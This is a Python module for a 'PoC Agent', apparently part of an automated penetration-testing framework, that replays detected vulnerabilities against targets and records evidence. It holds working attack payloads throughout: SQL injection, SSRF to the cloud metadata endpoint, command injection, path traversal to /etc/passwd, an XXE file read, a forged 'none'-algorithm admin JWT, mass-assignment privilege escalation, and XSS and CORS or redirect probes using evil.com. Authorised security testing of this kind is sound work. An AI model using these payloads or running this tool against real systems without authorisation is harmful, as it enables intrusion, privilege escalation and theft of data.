#!/usr/bin/env python3
"""
PoC Agent — Real-Time Proof-of-Concept Evidence Generation
=============================================================
Automatically reproduces vulnerabilities detected by the Vulnerability Agent
and captures real evidence using two execution environments:

  1. Terminal Mode — curl-based HTTP replay for request-based vulns
     (IDOR, BOLA, Mass Assignment, SQLi, SSRF, Auth Bypass, CORS, Misconfig)

  2. Browser Mode — Playwright-based automation for client-side vulns
     (XSS, DOM-based, Auth flows, Session exploitation)

Evidence pipeline:
  - Replay vulnerable request with exploit payload
  - Capture full HTTP request + response logs
  - Capture screenshots (browser mode)
  - Capture network/HAR logs (browser mode)
  - Save payload results
  - Validate by repeating attack N times
  - Mark verified_poc = true if consistently reproducible

Evidence storage:
  evidence/screenshots/     — browser screenshots (PNG)
  evidence/http_logs/       — HTTP request/response captures
  evidence/payload_results/ — payload output + validation logs
"""

import json
import logging
import os
import re
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, urljoin, urlparse

from agents.base_agent import BaseAgent
from typing import Any, Dict, List, Optional

logger = logging.getLogger("agent.poc")

BASE_DIR = Path(__file__).parent.parent.resolve()
EVIDENCE_DIR = BASE_DIR / "evidence"
SCREENSHOTS_DIR = EVIDENCE_DIR / "screenshots"
HTTP_LOGS_DIR = EVIDENCE_DIR / "http_logs"
PAYLOAD_RESULTS_DIR = EVIDENCE_DIR / "payload_results"

# Number of retries used to validate reproducibility
VALIDATION_RETRIES = 3
# Minimum success ratio to mark as verified
VALIDATION_THRESHOLD = 0.66

# Vuln types that require browser-based PoC
BROWSER_VULN_TYPES = {
    "XSS", "DOM_XSS", "STORED_XSS", "REFLECTED_XSS",
    "OPEN_REDIRECT", "CLICKJACKING", "CSRF",
    "SESSION_HIJACK", "AUTH_FLOW",
}

# Vuln types handled by terminal (curl) PoC
TERMINAL_VULN_TYPES = {
    "SQL_INJECTION", "SSRF", "IDOR", "BOLA",
    "MASS_ASSIGNMENT", "AUTHENTICATION", "AUTHORIZATION",
    "CORS", "SECURITY_MISCONFIG", "SENSITIVE_DATA_EXPOSURE",
    "RATE_LIMITING", "PATH_TRAVERSAL", "COMMAND_INJECTION",
    "XXE", "HTTP_SMUGGLING", "CACHE_POISONING",
    "JWT_SECURITY", "NUCLEI",
}


def _playwright_available() -> bool:
    """Check if Playwright is importable and browsers are installed."""
    try:
        from playwright.sync_api import sync_playwright
        return True
    except ImportError:
        return False


class PoCAgent(BaseAgent):
    """Real-time PoC generation with terminal and browser execution modes."""

    name = "PoCAgent"
    description = "Real-time PoC evidence — terminal HTTP replay + Playwright browser automation"
    phase = "poc_validation"

    def __init__(self, config: dict, kb, tools):
        super().__init__(config, kb, tools)
        self.has_playwright = _playwright_available()
        if self.has_playwright:
            self._log("Playwright available — browser mode enabled")
        else:
            self._log("Playwright not installed — browser mode disabled, using terminal fallback",
                      level="warning")

    # ------------------------------------------------------------------
    # Plan
    # ------------------------------------------------------------------
    def plan(self) -> List[dict]:
        """Build PoC plan from DRAFT vulnerabilities in the KB."""
        actions = []
        vulns = self.kb.get_vulnerabilities(status="DRAFT")

        for vuln in vulns:
            finding_id = vuln.get("finding_id", "")
            vuln_type = vuln.get("vuln_type", "")
            endpoint = vuln.get("endpoint", "")

            mode = self._decide_mode(vuln_type)

            actions.append({
                "action": "generate_poc",
                "target": endpoint,
                "finding_id": finding_id,
                "vuln_type": vuln_type,
                "mode": mode,
                "description": f"PoC [{mode}] {vuln_type} at {endpoint} ({finding_id})",
                "vulnerability": vuln,
            })

        return actions

    def _decide_mode(self, vuln_type: str) -> str:
        """Decide terminal vs browser mode based on vulnerability type."""
        if vuln_type in BROWSER_VULN_TYPES and self.has_playwright:
            return "browser"
        return "terminal"

    # ------------------------------------------------------------------
    # Execute
    # ------------------------------------------------------------------
    def execute(self, plan: List[dict]) -> List[dict]:
        self._ensure_dirs()
        results = []

        for action in plan:
            finding_id = action["finding_id"]
            vuln_type = action["vuln_type"]
            target = action["target"]
            mode = action["mode"]
            vuln = action["vulnerability"]

            self._log(f"Executing: {action['description']}")

            if mode == "browser":
                result = self._browser_poc(finding_id, vuln_type, target, vuln)
            else:
                result = self._terminal_poc(finding_id, vuln_type, target, vuln)

            result["action"] = "generate_poc"
            result["target"] = target
            result["finding_id"] = finding_id
            result["mode"] = mode
            results.append(result)

        return results

    def _ensure_dirs(self):
        """Create evidence subdirectories."""
        SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
        HTTP_LOGS_DIR.mkdir(parents=True, exist_ok=True)
        PAYLOAD_RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    # ==================================================================
    #  TERMINAL MODE — curl-based HTTP replay
    # ==================================================================
    def _terminal_poc(self, finding_id: str, vuln_type: str,
                      target: str, vuln: dict) -> dict:
        """Terminal-mode PoC: replay HTTP requests, capture evidence."""
        evidence_files = []
        payload_used = ""
        validation_results = []

        # Build the exploit request based on vuln type
        request_builder = self._get_terminal_builder(vuln_type)
        exploit_url, method, headers, data, payload_used = request_builder(target, vuln)

        # --- Run validation loop ---
        for attempt in range(VALIDATION_RETRIES):
            self._log(f"  Validation attempt {attempt + 1}/{VALIDATION_RETRIES} for {finding_id}")

            # Capture verbose request + response
            curl_args = ["-v", "--connect-timeout", "10"]
            tr = self.tools.curl(exploit_url, method=method, headers=headers,
                                 data=data, extra_args=curl_args)

            success = self._check_terminal_success(vuln_type, tr, vuln)
            validation_results.append({
                "attempt": attempt + 1,
                "success": success,
                "http_status": self._extract_status(tr.stdout),
                "response_length": len(tr.stdout),
            })

            # Save HTTP log for every attempt
            log_path = self._save_http_log(
                finding_id, attempt + 1, exploit_url, method,
                headers or {}, data or "", tr
            )
            evidence_files.append({"type": "http_log", "path": str(log_path)})

        # --- Evaluate validation ---
        successes = sum(1 for v in validation_results if v["success"])
        verified_poc = (successes / VALIDATION_RETRIES) >= VALIDATION_THRESHOLD

        # Save payload result summary
        payload_path = self._save_payload_result(
            finding_id, vuln_type, "terminal", payload_used,
            validation_results, verified_poc
        )
        evidence_files.append({"type": "payload_result", "path": str(payload_path)})

        # Store all evidence in KB
        for ev in evidence_files:
            self.kb.add_evidence(finding_id, ev["type"], ev["path"])

        # Record in poc_results DB
        self.kb.add_poc_result(
            finding_id, poc_mode="terminal", verified=verified_poc,
            payload=payload_used,
            successes=successes, retries=VALIDATION_RETRIES,
            evidence_files=[e["path"] for e in evidence_files],
        )

        # Update vulnerability status
        if verified_poc:
            self.kb.validate_finding(
                finding_id, "POC_VERIFIED",
                notes=f"Terminal PoC verified ({successes}/{VALIDATION_RETRIES} successful)"
            )
        else:
            self.kb.validate_finding(
                finding_id, "POC_FAILED",
                notes=f"Terminal PoC failed ({successes}/{VALIDATION_RETRIES} successful)"
            )

        return {
            "status": "ok",
            "verified_poc": verified_poc,
            "validation_successes": successes,
            "validation_total": VALIDATION_RETRIES,
            "payload": payload_used,
            "evidence_count": len(evidence_files),
        }

    def _get_terminal_builder(self, vuln_type: str):
        """Return a function that builds the exploit request for a vuln type."""
        builders = {
            "SQL_INJECTION": self._build_sqli_request,
            "SSRF": self._build_ssrf_request,
            "IDOR": self._build_idor_request,
            "BOLA": self._build_idor_request,
            "CORS": self._build_cors_request,
            "SECURITY_MISCONFIG": self._build_misconfig_request,
            "SENSITIVE_DATA_EXPOSURE": self._build_data_exposure_request,
            "COMMAND_INJECTION": self._build_cmdi_request,
            "PATH_TRAVERSAL": self._build_traversal_request,
            "JWT_SECURITY": self._build_jwt_request,
            "AUTHENTICATION": self._build_auth_request,
            "AUTHORIZATION": self._build_authz_request,
            "MASS_ASSIGNMENT": self._build_mass_assign_request,
            "XXE": self._build_xxe_request,
            "RATE_LIMITING": self._build_rate_limit_request,
        }
        return builders.get(vuln_type, self._build_generic_request)

    # --- Request builders ---
    # Each returns: (url, method, headers_dict_or_None, body_or_None, payload_description)

    def _build_sqli_request(self, target, vuln):
        desc = vuln.get("description", "")
        # Extract param name from description if possible
        param_match = re.search(r"parameter '(\w+)'", desc)
        param = param_match.group(1) if param_match else "id"
        payload = "' OR '1'='1' --"
        url = f"{target}?{param}={quote(payload)}"
        return url, "GET", None, None, f"SQLi payload in '{param}': {payload}"

    def _build_ssrf_request(self, target, vuln):
        desc = vuln.get("description", "")
        param_match = re.search(r"parameter '(\w+)'", desc)
        param = param_match.group(1) if param_match else "url"
        payload = "http://169.254.169.254/latest/meta-data/"
        url = f"{target}?{param}={quote(payload)}"
        return url, "GET", None, None, f"SSRF via '{param}': {payload}"

    def _build_idor_request(self, target, vuln):
        # Try accessing a different user's resource
        url = target
        if "/1" in target:
            url = target.replace("/1", "/2")
        elif not target.endswith("/"):
            url = target + "/2"
        return url, "GET", None, None, f"IDOR: accessing alternate resource ID at {url}"

    def _build_cors_request(self, target, vuln):
        headers = {"Origin": "https://evil.com"}
        return target, "GET", headers, None, "CORS: Origin header set to https://evil.com"

    def _build_misconfig_request(self, target, vuln):
        return target, "GET", None, None, "Security misconfiguration check (header analysis)"

    def _build_data_exposure_request(self, target, vuln):
        endpoint = vuln.get("endpoint", target)
        return endpoint, "GET", None, None, f"Sensitive data exposure at {endpoint}"

    def _build_cmdi_request(self, target, vuln):
        payload = ";id"
        url = f"{target}?cmd={quote(payload)}"
        return url, "GET", None, None, f"Command injection: {payload}"

    def _build_traversal_request(self, target, vuln):
        payload = "../../../../etc/passwd"
        url = f"{target}?file={quote(payload)}"
        return url, "GET", None, None, f"Path traversal: {payload}"

    def _build_jwt_request(self, target, vuln):
        headers = {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}
        return target, "GET", headers, None, "JWT none algorithm bypass attempt"

    def _build_auth_request(self, target, vuln):
        return target, "GET", None, None, "Authentication bypass — unauthenticated access"

    def _build_authz_request(self, target, vuln):
        return target, "GET", None, None, "Authorization bypass — accessing protected resource"

    def _build_mass_assign_request(self, target, vuln):
        data = json.dumps({"role": "admin", "is_admin": True})
        headers = {"Content-Type": "application/json"}
        return target, "POST", headers, data, "Mass assignment: injecting role=admin"

    def _build_xxe_request(self, target, vuln):
        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        headers = {"Content-Type": "application/xml"}
        return target, "POST", headers, payload, "XXE: external entity file read"

    def _build_rate_limit_request(self, target, vuln):
        return target, "GET", None, None, "Rate limit bypass — rapid sequential requests"

    def _build_generic_request(self, target, vuln):
        return target, "GET", None, None, f"Generic PoC request to {target}"

    # --- Terminal success checkers ---
    def _check_terminal_success(self, vuln_type: str, tr, vuln: dict) -> bool:
        """Check if the terminal PoC succeeded based on response analysis."""
        if not tr.success:
            return False

        body = tr.stdout.lower()
        stderr = tr.stderr.lower()
        status = self._extract_status(tr.stdout)

        if vuln_type == "SQL_INJECTION":
            sql_indicators = ["sql syntax", "mysql", "sqlite", "postgresql",
                              "syntax error", "unclosed quotation", "unterminated"]
            return any(ind in body for ind in sql_indicators)

        elif vuln_type == "SSRF":
            return any(ind in body for ind in ["ami-id", "instance-id", "meta-data",
                                                "127.0.0.1", "localhost", "internal"])

        elif vuln_type in ("IDOR", "BOLA"):
            return status in ("200", "301", "302")

        elif vuln_type == "CORS":
            return "access-control-allow-origin: https://evil.com" in body or \
                   "access-control-allow-origin: *" in body

        elif vuln_type == "SECURITY_MISCONFIG":
            # Success = missing security headers still present
            return status not in ("0", "000", "503")

        elif vuln_type == "SENSITIVE_DATA_EXPOSURE":
            return any(ind in body for ind in ["password", "secret", "api_key",
                                                "database", "private_key"])

        elif vuln_type == "COMMAND_INJECTION":
            return any(ind in body for ind in ["uid=", "root:", "/bin/"])

        elif vuln_type == "PATH_TRAVERSAL":
            return "root:" in body or "/bin/" in body

        elif vuln_type == "XXE":
            return "root:" in body or "passwd" in body

        elif vuln_type == "RATE_LIMITING":
            return status == "200"  # No rate limit = success for PoC

        # Default: any 2xx/3xx response
        try:
            return 200 <= int(status) < 400
        except (ValueError, TypeError):
            return False

    def _extract_status(self, stdout: str) -> str:
        """Extract HTTP status code from curl output (last line)."""
        lines = stdout.strip().splitlines()
        return lines[-1].strip() if lines else "0"

    # ==================================================================
    #  BROWSER MODE — Playwright-based automation
    # ==================================================================
    def _browser_poc(self, finding_id: str, vuln_type: str,
                     target: str, vuln: dict) -> dict:
        """Browser-mode PoC using Playwright for client-side vulnerabilities."""
        if not self.has_playwright:
            self._log(f"  Playwright unavailable — falling back to terminal for {finding_id}")
            return self._terminal_poc(finding_id, vuln_type, target, vuln)

        evidence_files = []
        payload_used = ""
        validation_results = []

        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            self._log("  Playwright import failed — falling back to terminal")
            return self._terminal_poc(finding_id, vuln_type, target, vuln)

        # Build the browser exploit
        exploit_url, payload_used = self._build_browser_exploit(vuln_type, target, vuln)

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)

            for attempt in range(VALIDATION_RETRIES):
                self._log(f"  Browser validation {attempt + 1}/{VALIDATION_RETRIES} for {finding_id}")

                context = browser.new_context(
                    record_har_path=str(HTTP_LOGS_DIR / f"{finding_id}_attempt{attempt + 1}.har"),
                    ignore_https_errors=True,
                )
                page = context.new_page()

                # Collect console messages for XSS detection
                console_messages = []
                dialog_triggered = []
                page.on("console", lambda msg: console_messages.append(msg.text))
                page.on("dialog", lambda dialog: self._handle_dialog(dialog, dialog_triggered))

                success = False
                try:
                    # Navigate to the exploit URL
                    response = page.goto(exploit_url, wait_until="networkidle", timeout=15000)

                    # Wait for any JS to execute
                    page.wait_for_timeout(2000)

                    # Check success based on vuln type
                    success = self._check_browser_success(
                        vuln_type, page, response, console_messages, dialog_triggered, vuln
                    )

                    # Capture screenshot
                    screenshot_path = SCREENSHOTS_DIR / f"{finding_id}_attempt{attempt + 1}.png"
                    page.screenshot(path=str(screenshot_path), full_page=True)
                    evidence_files.append({"type": "screenshot", "path": str(screenshot_path)})

                except Exception as e:
                    self._log(f"  Browser error on attempt {attempt + 1}: {e}", level="warning")

                finally:
                    context.close()

                # HAR file is auto-saved by Playwright
                har_path = HTTP_LOGS_DIR / f"{finding_id}_attempt{attempt + 1}.har"
                if har_path.exists():
                    evidence_files.append({"type": "har_log", "path": str(har_path)})

                validation_results.append({
                    "attempt": attempt + 1,
                    "success": success,
                    "console_messages": console_messages[:10],
                    "dialog_triggered": len(dialog_triggered) > 0,
                })

            browser.close()

        # --- Evaluate validation ---
        successes = sum(1 for v in validation_results if v["success"])
        verified_poc = (successes / VALIDATION_RETRIES) >= VALIDATION_THRESHOLD

        # Save payload result
        payload_path = self._save_payload_result(
            finding_id, vuln_type, "browser", payload_used,
            validation_results, verified_poc
        )
        evidence_files.append({"type": "payload_result", "path": str(payload_path)})

        # Store evidence in KB
        for ev in evidence_files:
            self.kb.add_evidence(finding_id, ev["type"], ev["path"])

        # Record in poc_results DB
        self.kb.add_poc_result(
            finding_id, poc_mode="browser", verified=verified_poc,
            payload=payload_used,
            successes=successes, retries=VALIDATION_RETRIES,
            evidence_files=[e["path"] for e in evidence_files],
        )

        # Update vulnerability status
        if verified_poc:
            self.kb.validate_finding(
                finding_id, "POC_VERIFIED",
                notes=f"Browser PoC verified ({successes}/{VALIDATION_RETRIES} successful)"
            )
        else:
            self.kb.validate_finding(
                finding_id, "POC_FAILED",
                notes=f"Browser PoC failed ({successes}/{VALIDATION_RETRIES} successful)"
            )

        return {
            "status": "ok",
            "verified_poc": verified_poc,
            "validation_successes": successes,
            "validation_total": VALIDATION_RETRIES,
            "payload": payload_used,
            "evidence_count": len(evidence_files),
        }

    def _handle_dialog(self, dialog, dialog_list):
        """Handle browser dialog (alert/confirm/prompt) — evidence of XSS."""
        dialog_list.append({"type": dialog.type, "message": dialog.message})
        dialog.accept()

    def _build_browser_exploit(self, vuln_type: str, target: str,
                                vuln: dict) -> tuple:
        """Build exploit URL + payload for browser-based PoC."""
        if vuln_type in ("XSS", "REFLECTED_XSS", "DOM_XSS"):
            desc = vuln.get("description", "")
            param_match = re.search(r"parameter '(\w+)'", desc)
            param = param_match.group(1) if param_match else "q"
            payload = '<script>alert("XSS-POC")</script>'
            url = f"{target}?{param}={quote(payload)}"
            return url, f"XSS payload in '{param}': {payload}"

        elif vuln_type == "OPEN_REDIRECT":
            url = f"{target}?redirect=https://evil.com&next=https://evil.com"
            return url, "Open redirect to https://evil.com"

        elif vuln_type == "CSRF":
            # Navigate to the target form page
            return target, "CSRF: loading target form page for token analysis"

        elif vuln_type == "CLICKJACKING":
            return target, "Clickjacking: loading page to check X-Frame-Options"

        # Default: just load the page
        return target, f"Browser navigation to {target}"

    def _check_browser_success(self, vuln_type: str, page, response,
                                console_messages: list, dialog_triggered: list,
                                vuln: dict) -> bool:
        """Evaluate whether the browser-based exploit succeeded."""
        if vuln_type in ("XSS", "REFLECTED_XSS", "DOM_XSS"):
            # XSS confirmed if: dialog was triggered OR payload appears in DOM
            if dialog_triggered:
                return True
            # Check if payload is in page content
            try:
                content = page.content()
                if "XSS-POC" in content or "<script>alert" in content:
                    return True
                # Check for payload in console errors
                for msg in console_messages:
                    if "XSS-POC" in msg:
                        return True
            except Exception:
                pass
            return False

        elif vuln_type == "OPEN_REDIRECT":
            # Check if page navigated to evil.com
            current_url = page.url
            return "evil.com" in current_url

        elif vuln_type == "CSRF":
            # Check if forms lack CSRF tokens
            try:
                forms = page.query_selector_all("form")
                for form in forms:
                    inputs = form.query_selector_all("input[type='hidden']")
                    has_token = any("csrf" in (inp.get_attribute("name") or "").lower() or
                                    "token" in (inp.get_attribute("name") or "").lower()
                                    for inp in inputs)
                    if not has_token:
                        return True
            except Exception:
                pass
            return False

        elif vuln_type == "CLICKJACKING":
            # Already caught by header checks, but verify
            if response:
                headers = {k.lower(): v for k, v in response.headers.items()}
                return "x-frame-options" not in headers

        # Default: page loaded successfully
        return response is not None and response.ok

    # ==================================================================
    #  Evidence persistence
    # ==================================================================
    def _save_http_log(self, finding_id: str, attempt: int, url: str,
                       method: str, headers: dict, body: str, tr) -> Path:
        """Save full HTTP request/response log."""
        log_file = HTTP_LOGS_DIR / f"{finding_id}_attempt{attempt}_http.txt"

        content = f"""# ============================================================================
# HTTP Evidence — {finding_id} (Attempt {attempt}/{VALIDATION_RETRIES})
# ============================================================================
# Timestamp: {datetime.now().isoformat()}
# URL: {url}
# Method: {method}
# ============================================================================

## REQUEST

{method} {url}
"""
        for k, v in headers.items():
            content += f"{k}: {v}\n"
        if body:
            content += f"\n{body}\n"

        content += f"""
## RESPONSE HEADERS (from curl -v stderr)

{tr.stderr}

## RESPONSE BODY

{tr.stdout}
"""
        with open(log_file, "w") as f:
            f.write(content)
        return log_file

    def _save_payload_result(self, finding_id: str, vuln_type: str, mode: str,
                              payload: str, validation_results: list,
                              verified: bool) -> Path:
        """Save structured payload validation result as JSON."""
        result_file = PAYLOAD_RESULTS_DIR / f"{finding_id}_payload_result.json"

        result = {
            "finding_id": finding_id,
            "vuln_type": vuln_type,
            "poc_mode": mode,
            "payload": payload,
            "verified_poc": verified,
            "validation_retries": VALIDATION_RETRIES,
            "validation_threshold": VALIDATION_THRESHOLD,
            "validation_results": validation_results,
            "successes": sum(1 for v in validation_results if v["success"]),
            "timestamp": datetime.now().isoformat(),
        }

        with open(result_file, "w") as f:
            json.dump(result, f, indent=2, default=str)
        return result_file

    # ------------------------------------------------------------------
    # Report
    # ------------------------------------------------------------------
    def report(self) -> dict:
        """Summarize PoC generation results."""
        vulns = self.kb.get_vulnerabilities()
        verified = [v for v in vulns if v.get("status") == "POC_VERIFIED"]
        failed = [v for v in vulns if v.get("status") == "POC_FAILED"]
        evidence = self.kb.get_all("evidence")

        terminal_count = sum(1 for r in self.results if r.get("mode") == "terminal")
        browser_count = sum(1 for r in self.results if r.get("mode") == "browser")

        return {
            "agent": self.name,
            "phase": self.phase,
            "state": self.state,
            "total_pocs_attempted": len(self.results),
            "verified_pocs": len(verified),
            "failed_pocs": len(failed),
            "terminal_mode_count": terminal_count,
            "browser_mode_count": browser_count,
            "evidence_items": len(evidence),
            "playwright_available": self.has_playwright,
            "verified_findings": [v.get("finding_id") for v in verified],
            "failed_findings": [v.get("finding_id") for v in failed],
        }
